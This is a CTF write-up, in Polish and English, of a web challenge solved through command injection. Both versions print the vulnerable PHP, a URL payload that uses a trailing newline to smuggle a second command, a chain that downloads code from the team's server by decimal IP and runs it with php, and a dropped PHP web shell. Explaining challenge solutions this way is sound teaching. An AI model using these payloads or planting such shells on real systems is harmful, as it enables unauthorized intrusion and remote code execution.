## Babyfirst (web, 100p, ?? solves)

> baby, do it first.

> http://52.68.245.164

### PL
[ENG](#eng-version)

Po połączeniu się pod podany url wyświetla się nam taka strona:

```php
<?php
    highlight_file(__FILE__);

    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $args = $_GET['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }
    exec("/bin/orange " . implode(" ", $args));
?>
```

Program tworzy folder "sandbox/NASZE_IP" oraz `chdir`uje do niego. Możemy wyświetlić zawartość tego folderu nawigując w przeglądarce
do http://52.68.245.164/sandbox/NASZE_IP. Straciliśmy w tym momencie dużo czasu na zgadywanie co robi /bin/orange (cóż, okazuje się że nic - był to link symboliczny do /bin/true).

Ale później zaczeliśmy myśleć, w jaki sposób można ominąć preg_match() - bo to jedyny sposób jaki widzieliśmy. Próbowaliśmy różnych rzeczy,
ale ostatecznie zauważyliśmy bardzo ciekawą rzecz - jeśli ostatnim bajtem wyrazu jest \n, przechodzi on ten check. Co to oznacza? Że możemy 
zmusić exec do wykonania czegoś takiego:

http://52.68.245.164/?args[]=a%0A&args[]=touch&args[]=cat

```
/bin/orange a
touch cat
```

I stworzy nam to plik `cat` w naszym sandboxowym folderze. Jest to bardzo duży krok w przód - możemy wykonać dowolne polecenie składające się ze znaków alfanumerycznych.
Następnie myśleliśmy długo, jaką komendę wykonać - wszystko ciekawe wymagało użycia albo albo slasha, albo myślnika, albo kropki.

Odkryliśmy na szczęście w pewnym momencie, że wget ciągle wspiera pobieranie stron po IP, podanym jako liczbie! To znaczy że zadziała coś takiego:

http://92775836/

W tym momencie byliśmy kolejny duży krok bliżej rozwiązania zadania - wget może np. pobrać kod php z naszego serwera (jako tekst), a my wykonamy go za pomocą lokalnego intepretera php.
Niestety, duży problem. Wget zapisuje pliki do pliku o nazwie "index.html", a my nie jesteśmy w stanie takiej nazwy przekazać php (kropka!). Redirecty
po stronie serwera nie zmienią też nazwy pliku, bo do tego trzeba przekazać wgetowi odpowiednią opcję (myślnik!).

Zaczęliśmy się więc zastanawiać nad poleceniami, które dla podania swoich argumentów nie wymagają myślników. Od razu na myśl przyszedł nam `tar`. Gdyby udało nam się przekazać stworzone archiwum do interpretera PHP, ten powinien zignorować wszystko poza kodem PHP zawartym w `<?php ?>`.

Ciąg naszych ostatecznych poleceń wygląda następująco:

```
mkdir exploit
cd exploit
wget 92775836
tar cvf archived exploit
php archived
```

Nasz "eksploit" działał w następujący sposób:

```php
<?php
file_put_contents('shell.php', '
    <?php
    header("Content-Type: text/plain");
    print shell_exec($_GET["cmd"]);
    ?>
');
?>
```

Dzięki temu mogliśmy wykonywać już polecenia bez żadnych ograniczeń i w ten sposób szybko znaleźliśmy program odczytujący flagę w `/`.

### ENG version

After connecting to the provided url we get the following page:

```php
<?php
    highlight_file(__FILE__);

    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $args = $_GET['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }
    exec("/bin/orange " . implode(" ", $args));
?>
```

The program creates a directory: "sandbox/OUR_IP" and `chdir`s to it. We can list contents of the folder in a browser by navigating to http://52.68.245.164/sandbox/OUR_IP. We lost a lot of time at this moment by guessing what /bin/orange does (well, it turns out it does nothing, it's just a symbolic link to /bin/true). 

But then we started to think about how to bypass the preg_match() check - seeing as it was the only possible way. We tried a lot of things but finally noticed an interesting feat - if the last byte of the string is a newline character (`\n`) it also passes the check. What does it mean? That we can force exec to execute something like this:

http://52.68.245.164/?args[]=a%0A&args[]=touch&args[]=cat

```
/bin/orange a
touch cat
```

And that will create us a file named `cat` in our sandboxed folder. It's a big step forward - we can now execute an arbitrary command composing of alphanumeric characters. Then we thought long about which command to actually execute - everything interesting needed using slash, dash or dot.

But lucky us, we finally discoverd that `wget` is still supporting resolving ip hosts by its `long` number format. That means that we can make a download from:

http://92775836/

And that took us even further to completing the task: wget can download a php code from our webserver as text and then we'll execute it passing it to the local PHP interpreter.
However, there's a big problem: wget saves contents to a file named `index.html`, but we can't pass that filename to php (the dot!). Server-side redirects won't change the filename as well, because wget needs a parameter for that (dash!).

We begun by thinking of all commands which for their arguments don't need dashes. We almost instantly thought of `tar`. If we could pass a non-compressed archive to the PHP interpreter it should ignore everything besides PHP code enclosed in `<?php ?>`. 

Our final command chain looks like this:

```
mkdir exploit
cd exploit
wget 92775836
tar cvf archived exploit
php archived
```

Our "exploit" worked in a following way:

```php
<?php
file_put_contents('shell.php', '
    <?php
    header("Content-Type: text/plain");
    print shell_exec($_GET["cmd"]);
    ?>
');
?>
```

Thanks to which we could execute commands with no limitations of the character set and that way we quickly found a program giving us a flag sitting in `/`.

